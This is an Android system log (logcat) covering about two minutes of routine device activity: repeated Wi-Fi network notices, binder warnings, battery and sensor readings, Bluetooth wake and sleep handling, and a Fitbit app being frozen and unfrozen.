06-30 03:17:10.843  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:17:10.843  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:17:10.849  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:17:10.850  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:17:10.850  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:17:10.851  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:17:10.852  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:17:10.853  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:17:10.854  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:17:13.883  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:17:16.779   391   416 E pixelstats-uevent: Unable to read  - No such file or directory
06-30 03:17:16.914  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:17:16.920   391   416 E pixelstats-uevent: Unable to read  - No such file or directory
06-30 03:17:16.935  1435  1435 E BatteryDefender: Failed to read /sys/devices/platform/google,charger/bd_state
06-30 03:17:16.948  1435  1435 E BatteryDefender: Failed to read /sys/devices/platform/google,charger/bd_state
06-30 03:17:19.968  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:17:20.575  1719  1793 D HighBrightnessModeController: onAmbientLuxChange: 1.015/25000.0, IsHighLux: false
06-30 03:17:21.266   857   857 E ODPM    : readEnergyMeter()
06-30 03:17:22.179  1719  1793 D HighBrightnessModeController: onAmbientLuxChange: 3.6999996/25000.0, IsHighLux: false
06-30 03:17:23.015  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:17:23.015  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:17:23.021  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:17:23.023  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:17:23.023  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:17:23.023  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:17:23.025  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:17:23.025  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:17:23.027  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:17:23.028  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:17:26.062  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:17:28.175  1719  1793 D HighBrightnessModeController: onAmbientLuxChange: 0.00125/25000.0, IsHighLux: false
06-30 03:17:28.182  1719  1793 D HighBrightnessModeController: onAmbientLuxChange: 0.017999586/25000.0, IsHighLux: false
06-30 03:17:28.376  1719  1793 D HighBrightnessModeController: onAmbientLuxChange: 0.02625/25000.0, IsHighLux: false
06-30 03:17:28.382  1719  1793 D HighBrightnessModeController: onAmbientLuxChange: 1.6141108/25000.0, IsHighLux: false
06-30 03:17:29.115  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:17:30.904   855   880 D ContextHubHal: Got message from nanoapp: ID 0x476f6f676c003000
06-30 03:17:31.149   721   859 D MCU     : site_data_provider.cc:220        16:32:16.946 [SiteDataProvider] Flushing 1 SLEEP_300S records
06-30 03:17:31.149   721   859 D MCU     : site_data_provider.cc:220        16:32:16.946 [SiteDataProvider] Flushing 1 SLEEP_300S records
06-30 03:17:31.736   391   416 E pixelstats-uevent: Unable to read  - No such file or directory
06-30 03:17:32.154  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:17:32.155  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:17:32.158  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:17:32.166  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:17:32.170  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:17:32.170  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:17:32.173  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:17:32.173  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:17:32.174  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:17:32.175  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:17:34.059   855   880 D ContextHubHal: Got message from nanoapp: ID 0x476f6f676c003000
06-30 03:17:34.148   721   859 D MCU     : site_data_provider.cc:220        16:32:20.203 [SiteDataProvider] Flushing 1 GROK records
06-30 03:17:34.149   721   859 D MCU     : site_data_provider.cc:220        16:32:20.204 [SiteDataProvider] Flushing 1 GROK records
06-30 03:17:35.198  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:17:38.224  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:17:38.225  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:17:38.232  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:17:38.235  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:17:38.235  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:17:38.236  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:17:38.239  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:17:38.240  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:17:38.242  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:17:38.242  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:17:40.364   391   416 E pixelstats-uevent: Unable to read  - No such file or directory
06-30 03:17:40.366  1435  1435 E BatteryDefender: Failed to read /sys/devices/platform/google,charger/bd_state
06-30 03:17:40.382  1435  1435 E BatteryDefender: Failed to read /sys/devices/platform/google,charger/bd_state
06-30 03:17:41.276  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:17:41.276  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:17:41.281  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:17:41.286  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:17:41.286  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:17:41.286  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:17:41.288  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:17:41.288  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:17:41.292  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:17:41.293  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:17:44.331  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:17:46.734   391   416 E pixelstats-uevent: Unable to read  - No such file or directory
06-30 03:17:47.379  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:17:50.426  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:17:50.426  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:17:50.431  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:17:50.434  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:17:50.435  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:17:50.435  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:17:50.439  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:17:50.439  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:17:50.440  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:17:50.440  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:17:51.970  1719  1793 D HighBrightnessModeController: onAmbientLuxChange: 2.7625/25000.0, IsHighLux: false
06-30 03:17:52.787  1628  1654 I pixel-thermal: CDEV log 
06-30 03:17:53.506  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:17:56.566  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:17:56.566  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:17:56.569  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:17:56.573  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:17:56.573  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:17:56.576  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:17:56.576  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:17:56.576  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:17:56.577  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:17:56.577  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:17:59.625  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:17:59.626  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:17:59.633  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:17:59.635  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:17:59.635  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:17:59.635  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:17:59.636  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:17:59.637  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:17:59.639  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:17:59.640  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:18:00.910   855   880 D ContextHubHal: Got message from nanoapp: ID 0x476f6f676c003000
06-30 03:18:01.160   721   859 D MCU     : calories_consumer.cc:157         16:32:47.873 Calories OnSample timestamp_ns=57885807586669 total=1.05
06-30 03:18:01.161   721   859 D MCU     : offload_data_provider_app.cc:1190 16:32:47.874 [OffloadDataProvider] Got Calories, total=288.74
06-30 03:18:01.741   391   416 E pixelstats-uevent: Unable to read  - No such file or directory
06-30 03:18:01.930  1719  1901 I SensorService: Setting connection 0xe47359c0 disabled status to 0 for reason 2
06-30 03:18:01.932  1719  1760 D ActivityManager: sync unfroze 8905 com.fitbit.FitbitMobile for 3
06-30 03:18:02.668  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:18:02.669  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:18:02.676  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:18:02.678  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:18:02.679  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:18:02.679  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:18:02.681  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:18:02.682  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:18:02.685  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:18:02.685  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:18:03.805   391   416 E pixelstats-uevent: Unable to read  - No such file or directory
06-30 03:18:03.806  1435  1435 E BatteryDefender: Failed to read /sys/devices/platform/google,charger/bd_state
06-30 03:18:03.817  1435  1435 E BatteryDefender: Failed to read /sys/devices/platform/google,charger/bd_state
06-30 03:18:05.715  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:18:05.720  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:18:05.720  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:18:05.727  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:18:05.727  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:18:05.728  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:18:05.730  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:18:05.732  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:18:05.733  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:18:05.734  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:18:07.004  1719  1974 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET, states=14
06-30 03:18:07.005  1719  1974 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET6, states=14
06-30 03:18:07.006  1719  1974 D InetDiagMessage: Destroyed live tcp sockets for uids={10111} in 2ms
06-30 03:18:07.006  1719  1974 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET, states=14
06-30 03:18:07.007  1719  1974 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET6, states=14
06-30 03:18:07.007  1719  1974 D InetDiagMessage: Destroyed live tcp sockets for uids={20111} in 1ms
06-30 03:18:07.018  1719  1914 D ActivityManager: freezing 8905 com.fitbit.FitbitMobile
06-30 03:18:07.019  1719  1901 I SensorService: Setting connection 0xe47359c0 disabled status to 1 for reason 2
06-30 03:18:07.023  1719  1974 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET, states=14
06-30 03:18:07.025  1719  1974 D InetDiagMessage: Destroyed 0 sockets, proto=IPPROTO_TCP, family=AF_INET6, states=14
06-30 03:18:07.026  1719  1974 D InetDiagMessage: Destroyed live tcp sockets for uids={10111} in 3ms
06-30 03:18:08.744  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:18:08.744  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:18:08.749  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:18:08.753  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:18:08.753  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:18:08.755  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:18:08.757  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:18:08.758  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:18:08.761  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:18:08.763  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:18:10.664   721   859 D MCU     : usf_sensor.cc:1920               16:32:57.598 [USF] Received start sampling request for Skin temperature sensor (active:1).
06-30 03:18:10.665   721   859 D MCU     : device.cc:154                    16:32:57.599 AS6221Device Set conversion timer: 60000000 ns
06-30 03:18:10.665   721   859 D MCU     : device.cc:173                    16:32:57.599 AS6221Device Set sampling timer:180000000
06-30 03:18:10.665   721   859 D MCU     : skin_temperature_manager.cc:333  16:32:57.662 [SkinTemperature] [Record Processing Incomplete] Processed 0 temperature samples.
06-30 03:18:11.787  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:18:11.788  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:18:11.789  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:18:11.794  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:18:11.795  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:18:11.795  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:18:11.796  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:18:11.797  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:18:11.799  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:18:11.800  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:18:14.859  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:18:16.941   391   416 E pixelstats-uevent: Unable to read  - No such file or directory
06-30 03:18:17.919  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:18:20.979  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:18:21.650  2188  2479 I bluetooth: system/gd/hci/le_address_manager.cc:557 GetNextPrivateAddressIntervalRange: client=LeAddressManager, nonwake=55m58s, wake=59m18s
06-30 03:18:21.651   853   853 D vendor.qti.bluetooth@1.0-wake_lock: Acquire wakelock is acquired 
06-30 03:18:21.651   853   861 D vendor.qti.bluetooth@1.0-ibs_handler: SerialClockVote: vote for UART CLK ON
06-30 03:18:21.655   853   861 D vendor.qti.bluetooth@1.0-uart_transport: ClockOperation: USERIAL_OP_CLK_ON - after sys fs write-ret:4
06-30 03:18:21.655   853   861 D vendor.qti.bluetooth@1.0-uart_transport: SocRxDWakeup: Flow off->Change UART baudrate to 38.4kbs->send 0x00->Change UART baudrate to max->Flow on
06-30 03:18:21.655   853   861 I vendor.qti.bluetooth@1.0-uart_transport: ## userial_vendor_ioctl: UART Flow Off 
06-30 03:18:21.657   853   861 I vendor.qti.bluetooth@1.0-uart_transport: ## userial_vendor_set_baud: 17
06-30 03:18:21.667   853   861 I vendor.qti.bluetooth@1.0-uart_transport: SetBaudRate: in BOTHER
06-30 03:18:21.667   853   861 I vendor.qti.bluetooth@1.0-uart_transport: ## userial_vendor_ioctl: UART Flow On 
06-30 03:18:21.667   853   861 I vendor.qti.bluetooth@1.0-ibs_handler: DeviceWakeUp: Writing IBS_WAKE_IND
06-30 03:18:21.667   853  2603 I vendor.qti.bluetooth@1.0-ibs_handler: ProcessIbsCmd: Received IBS_WAKE_ACK: 0xFC
06-30 03:18:21.667   853  2603 I vendor.qti.bluetooth@1.0-ibs_handler: ProcessIbsCmd: Signal wack_cond_
06-30 03:18:21.667   853  2603 I vendor.qti.bluetooth@1.0-ibs_handler: ProcessIbsCmd: Received IBS_WAKE_ACK: 0xFC
06-30 03:18:21.667   853  2603 I vendor.qti.bluetooth@1.0-ibs_handler: ProcessIbsCmd: Signal wack_cond_
06-30 03:18:21.668   853   861 D vendor.qti.bluetooth@1.0-ibs_handler: DeviceWakeUp: Unblocked from waiting for FC, pthread_cond_timedwait ret = 0
06-30 03:18:21.668   853  2603 I vendor.qti.bluetooth@1.0-ibs_handler: ProcessIbsCmd: Received IBS_WAKE_IND: 0xFD
06-30 03:18:21.668   853  2603 I vendor.qti.bluetooth@1.0-ibs_handler: ProcessIbsCmd: Writing IBS_WAKE_ACK
06-30 03:18:21.674  2188  2479 I bluetooth: system/gd/hci/le_address_manager.cc:758 OnCommandComplete: Received command complete with op_code LE_SET_RANDOM_ADDRESS(0x2005)
06-30 03:18:21.675  2188  2479 I bluetooth: system/gd/hci/le_address_manager.cc:778 OnCommandComplete: update random address : xx:xx:xx:xx:7c:95
06-30 03:18:21.675  2188  2479 I bluetooth: system/gd/hci/le_address_manager.cc:382 resume_registered_clients: Resuming registered clients
06-30 03:18:21.709   853  2603 I vendor.qti.bluetooth@1.0-ibs_handler: ProcessIbsCmd: Received IBS_SLEEP_IND: 0xFE
06-30 03:18:22.670   853  2607 I vendor.qti.bluetooth@1.0-ibs_handler: DeviceSleep: TX Awake, Sending SLEEP_IND
06-30 03:18:22.670   853  2607 D vendor.qti.bluetooth@1.0-ibs_handler: SerialClockVote: vote for UART CLK OFF
06-30 03:18:22.671   853  2607 D vendor.qti.bluetooth@1.0-uart_transport: ClockOperation: USERIAL_OP_CLK_OFF - after sys fs write-ret:4
06-30 03:18:22.824   853  2495 D vendor.qti.bluetooth@1.0-wake_lock: Release wakelock is released 
06-30 03:18:24.052  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:18:25.108   855   880 D ContextHubHal: Got message from nanoapp: ID 0x476f6f676c003000
06-30 03:18:25.171   721   859 D MCU     : site_data_provider.cc:220        16:33:12.838 [SiteDataProvider] Flushing 1 GROK records
06-30 03:18:25.172   721   859 D MCU     : site_data_provider.cc:220        16:33:12.838 [SiteDataProvider] Flushing 1 GROK records
06-30 03:18:27.098  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:18:27.254   391   416 E pixelstats-uevent: Unable to read  - No such file or directory
06-30 03:18:27.260  1435  1435 E BatteryDefender: Failed to read /sys/devices/platform/google,charger/bd_state
06-30 03:18:27.270  1435  1435 E BatteryDefender: Failed to read /sys/devices/platform/google,charger/bd_state
06-30 03:18:30.155  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:18:31.743   391   416 E pixelstats-uevent: Unable to read  - No such file or directory
06-30 03:18:33.196  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:18:33.196  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:18:33.199  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:18:33.207  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:18:33.209  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:18:33.210  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:18:33.212  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:18:33.212  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:18:33.212  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:18:33.214  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:18:36.255  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:18:39.289  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:18:39.290  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:18:39.292  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:18:39.296  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:18:39.297  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:18:39.298  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:18:39.298  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:18:39.299  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:18:39.302  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:18:39.302  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:18:42.324  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:18:45.377  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:18:45.384  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:18:45.388  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:18:45.390  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:18:45.391  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:18:45.391  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:18:45.393  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:18:45.393  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:18:45.394  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:18:45.394  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:18:46.897   391   416 E pixelstats-uevent: Unable to read  - No such file or directory
06-30 03:18:47.097  2817  2828 W adsp_wdog: vendor/qcom/proprietary/monaco/adsprpc/src/fastrpc_apps_user.c:1425:Warning: remote_handle_invoke: Non-domain usage of FastRPC will be deprecated, use domains to offload to DSP using FastRPC
06-30 03:18:47.106  2817  2828 I adsp_wdog: rpcversion_getSerialNum() returned: 9d5cd6d4
06-30 03:18:47.470  1719  1736 I system_server: Background young concurrent mark compact GC freed 6424KB AllocSpace bytes, 0(0B) LOS objects, 87% free, 31MB/256MB, paused 4.094ms,6.666ms total 127.506ms
06-30 03:18:48.411  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:18:48.411  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:18:48.414  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:18:48.419  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:18:48.420  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:18:48.420  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:18:48.422  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:18:48.422  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:18:48.422  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:18:48.426  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:18:50.683   391   416 E pixelstats-uevent: Unable to read  - No such file or directory
06-30 03:18:50.696  1435  1435 E BatteryDefender: Failed to read /sys/devices/platform/google,charger/bd_state
06-30 03:18:50.713  1435  1435 E BatteryDefender: Failed to read /sys/devices/platform/google,charger/bd_state
06-30 03:18:51.457  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:18:54.501  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:18:54.502  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:18:54.502  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:18:54.511  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:18:54.511  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:18:54.511  2304  2982 D cneJni  : sendDefaultNwMsg start
06-30 03:18:54.513  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:18:54.514  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:18:54.516  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:18:54.517  1719  1974 W libbinder.IPCThreadState: Sending oneway calls to frozen process.
06-30 03:18:54.720  1628  1654 I pixel-thermal: CDEV log 
06-30 03:18:57.563  1719  2003 I AdbWifiNetworkMonitor: Wi-Fi network available
06-30 03:18:57.563  1719  2003 I AdbWifiNetworkMonitor: Received the same Wi-Fi SSID. Ignoring.
06-30 03:18:57.569  2637  2987 D DeviceStateHelper: Wifi freq: 2412
06-30 03:18:57.570  1719  1967 I HalDevMgr: bestIfaceCreationProposal is null, requestIface=STA, existingIface=[name=wlan0 type=STA]
06-30 03:18:57.571  2304  2982 D cneJni  : sendWifiStatus start
06-30 03:18:57.571  3468  3688 W EdorasConnMonitorState: unhandled onNetworkConnected
06-30 03:18:57.573  2304  2982 D QCNEJ/NativeAidlConnector: -> SND notifyDefaultNetworkChanged(1)
06-30 03:18:57.574  2304  2982 D cneJni  : sendDefaultNwMsg start
